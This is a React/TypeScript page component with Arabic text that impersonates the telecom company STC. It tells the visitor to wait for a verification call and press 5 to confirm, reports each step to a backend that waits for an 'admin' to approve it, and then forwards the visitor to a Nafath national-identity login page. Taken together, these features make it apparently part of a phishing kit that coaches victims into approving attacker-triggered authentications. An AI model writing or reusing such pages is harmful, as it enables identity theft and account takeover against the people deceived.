import { useEffect, useState, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
} from "@/lib/store";

export default function STCCallAlert() {
  const [, navigate] = useLocation();
  const [callReceived, setCallReceived] = useState(false);
  const [buttonText, setButtonText] = useState("تم استلام المكالمة");
  const inputRef = useRef<HTMLButtonElement>(null);

  // Emit page enter
  useEffect(() => {
    navigateToPage("تنبية إتصال STC");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/nafath-login-page");
    }
  }, [isFormApproved.value, navigate]);

  // Handle form rejection - subscribe to signal changes
  useEffect(() => {
    const checkRejection = () => {
      if (isFormRejected.value) {
        console.log("Form rejected detected in STCCallAlert");
        setCallReceived(false);
        setButtonText("إعادة تلقي مكالمة");
        // Reset the rejection flag after handling
        isFormRejected.value = false;
        if (inputRef.current) {
          inputRef.current.focus();
        }
      }
    };
    
    // Check immediately
    checkRejection();
    
    // Subscribe to signal changes
    const unsubscribe = isFormRejected.subscribe(checkRejection);
    
    return () => {
      unsubscribe();
    };
  }, []);

  const handleCallReceived = () => {
    setCallReceived(true);
    sendData({
      data: { الحالة: "تم تلقي المكالمة" },
      current: "تنبية إتصال STC",
      nextPage: "تسجيل دخول نفاذ",
      waitingForAdminResponse: true,
    });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
            <svg
              className="w-10 h-10 text-green-600"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">انتظر المكالمة</h1>
          <p className="text-gray-500 text-sm">
            ستصلك مكالمة من STC للتحقق من هويتك
          </p>
        </div>

        {/* STC Logo */}
        <div className="flex justify-center mb-6">
          <img
            src="/images/my-stc.png"
            alt="STC"
            className="h-16"
          />
        </div>

        {/* Instructions */}
        <div className="bg-blue-50 rounded-lg p-4 mb-6">
          <h3 className="font-semibold text-blue-800 mb-2">تعليمات هامة:</h3>
          <ul className="text-sm text-blue-700 space-y-1 list-disc list-inside">
            <li>انتظر المكالمة الواردة من STC</li>
            <li>اتبع التعليمات الصوتية</li>
            <li>اضغط على الرقم <span className="font-bold" style={{color: '#4F008C'}}>5</span> للتأكيد</li>
          </ul>
        </div>

        {/* Phone Animation */}
        {!callReceived && (
          <div className="flex justify-center mb-6">
            <div className="relative">
              <img
                src="/images/phone-ringing.png"
                alt="Phone Ringing"
                className="w-24 h-24 animate-bounce"
              />
            </div>
          </div>
        )}

        {/* Button */}
        <Button
          ref={inputRef}
          onClick={handleCallReceived}
          className="w-full"
          size="lg"
          disabled={callReceived}
          style={{backgroundColor: callReceived ? '#9ca3af' : '#4F008C'}}
        >
          {callReceived ? "جاري التحقق..." : buttonText}
        </Button>
      </div>
    </PageLayout>
  );
}
